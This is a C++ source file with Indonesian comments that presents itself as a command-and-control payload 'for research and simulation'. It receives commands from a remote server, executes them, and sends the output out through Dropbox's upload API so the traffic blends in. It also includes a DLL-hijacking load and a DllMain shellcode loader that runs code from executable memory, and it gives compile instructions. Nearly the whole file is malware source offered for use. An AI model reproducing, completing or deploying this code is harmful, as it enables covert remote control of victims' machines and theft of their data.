// Payload ini menggunakan API Dropbox untuk mengunggah data, termasuk hasil perintah, ke Dropbox.
// Dengan menggunakan API Dropbox dan menyertakan access token, payload ini menyembunyikan lalu lintasnya
// dalam lalu lintas yang sah dari layanan Dropbox. Jika DLL berbahaya gagal dimuat,
// kode akan mencetak pesan peringatan tetapi tetap melanjutkan eksekusi.

// Catatan: Payload ini hanya untuk riset & simulasi. Saya tidak bertanggung jawab jika payload ini digunakan untuk tujuan ilegal.

// Cara kompilasi manual: i686-w64-mingw32-g++ c2_payload.cpp -o windoc.exe -lws2_32 -static-libgcc -static-libstdc++
// Cara menjalankan: ./c2_payload.exe server_ip port

#include <iostream>
#include <winsock2.h>
#include <windows.h>
#include <string>
#include <vector>
#include <algorithm>
#include <iterator>

#pragma comment(lib, "ws2_32.lib")

#define ACCESS_TOKEN "put Your dropbox access token here" // Access token untuk API Dropbox
#define DLL_NAME "malicious.dll" // Nama file DLL berbahaya

// Fungsi untuk mengeksekusi perintah dan mengembalikan hasil keluaran
std::string execute_command(const char* command) {
    char buffer[4096];
    std::string output = "";

    FILE* pipe = _popen(command, "r");
    if (!pipe) return "Error: gagal mengeksekusi perintah\n";

    while (!feof(pipe)) {
        if (fgets(buffer, 4096, pipe) != NULL)
            output += buffer;
    }

    _pclose(pipe);
    return output;
}

// Fungsi untuk mengirim data ke Dropbox menggunakan API Dropbox
bool send_to_dropbox(const std::string& data) {
    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) {
        std::cerr << "Error: gagal membuat socket\n";
        return false;
    }

    sockaddr_in server;
    server.sin_family = AF_INET;
    server.sin_port = htons(443); // Port HTTPS untuk Dropbox
    server.sin_addr.s_addr = inet_addr("162.125.5.14"); // IP Dropbox API

    if (connect(sock, (SOCKADDR *)&server, sizeof(server)) == SOCKET_ERROR) {
        std::cerr << "Error: gagal terhubung\n";
        closesocket(sock);
        return false;
    }

    // Membuat permintaan HTTP untuk mengunggah data ke Dropbox
    std::string request = "POST /2/files/upload HTTP/1.1\r\n";
    request += "Host: content.dropboxapi.com\r\n";
    request += "Content-Type: application/octet-stream\r\n";
    request += "Authorization: Bearer " + std::string(ACCESS_TOKEN) + "\r\n";
    request += "Dropbox-API-Arg: {\"path\": \"/payload.txt\"}\r\n";
    request += "Content-Length: " + std::to_string(data.size()) + "\r\n\r\n";
    request += data;

    send(sock, request.c_str(), request.size(), 0);

    closesocket(sock);
    return true;
}

// Fungsi DllMain untuk DLL berbahaya
BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
        case DLL_PROCESS_ATTACH: {
            // Shellcode yang akan disuntikkan
            unsigned char shellcode[] = {
                // Shellcode disini
            };

            // Pointers fungsi untuk WinAPI
            typedef LPVOID(WINAPI *VirtualAlloc_t)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
            typedef BOOL(WINAPI *VirtualFree_t)(LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType);

            VirtualAlloc_t virtualAlloc = (VirtualAlloc_t)GetProcAddress(GetModuleHandle("kernel32.dll"), "VirtualAlloc");
            VirtualFree_t virtualFree = (VirtualFree_t)GetProcAddress(GetModuleHandle("kernel32.dll"), "VirtualFree");

            if (virtualAlloc != NULL && virtualFree != NULL) {
                LPVOID pAlloc = virtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
                if (pAlloc != NULL) {
                    // Menyalin shellcode ke dalam memori yang dialokasikan
                    memcpy(pAlloc, shellcode, sizeof(shellcode));

                    // Menjalankan shellcode
                    ((void(*)())pAlloc)();

                    // Membebaskan memori yang telah dialokasikan
                    virtualFree(pAlloc, sizeof(shellcode), MEM_RELEASE);
                }
            }

            break;
        }
        case DLL_PROCESS_DETACH:
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        default:
            break;
    }
    return TRUE;
}

int main(int argc, char *argv[]) {
    if (argc != 3) {
        std::cerr << "Usage: " << argv[0] << " <server_ip> <server_port>\n";
        return 1;
    }

    WSADATA wsData;
    if (WSAStartup(MAKEWORD(2, 2), &wsData) != 0) {
        std::cerr << "Error: gagal menginisialisasi Winsock\n";
        return 1;
    }

    std::cout << "Terhubung ke Dropbox\n";

    // Memuat DLL berbahaya melalui hijacking DLL
    HMODULE hModule = LoadLibraryA(DLL_NAME);
    if (hModule == NULL) {
        std::cerr << "Peringatan: gagal memuat DLL berbahaya. melanjutkan tanpa itu.\n";
    }

    // Loop utama untuk koneksi ke server dan menerima perintah
    while (true) {
        SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (sock == INVALID_SOCKET) {
            std::cerr << "Error: gagal membuat socket\n";
            WSACleanup();
            return 1;
        }

        sockaddr_in server;
        server.sin_family = AF_INET;
        server.sin_port = htons(std::stoi(argv[2]));
        server.sin_addr.s_addr = inet_addr(argv[1]);

        if (connect(sock, (SOCKADDR *)&server, sizeof(server)) == SOCKET_ERROR) {
            std::cerr << "Error: Gagal terhubung ke server\n";
            closesocket(sock);
            continue;
        }

        std::cout << "Terhubung ke server C2 Dropbox\n";

        // Menerima perintah dari server
        char command[1024] = {0};
        int bytes_received = recv(sock, command, sizeof(command), 0);
        if (bytes_received <= 0) {
            std::cerr << "Error: gagal menerima perintah\n";
            closesocket(sock);
            continue;
        }

        std::cout << "Perintah diterima: " << command << std::endl;

        // Menjalankan perintah dan mengambil hasil keluaran
        std::string output = execute_command(command);

        // Mengirim hasil keluaran perintah ke Dropbox
        send_to_dropbox(output);

        closesocket(sock);
    }

    WSACleanup();
    return 0;
}
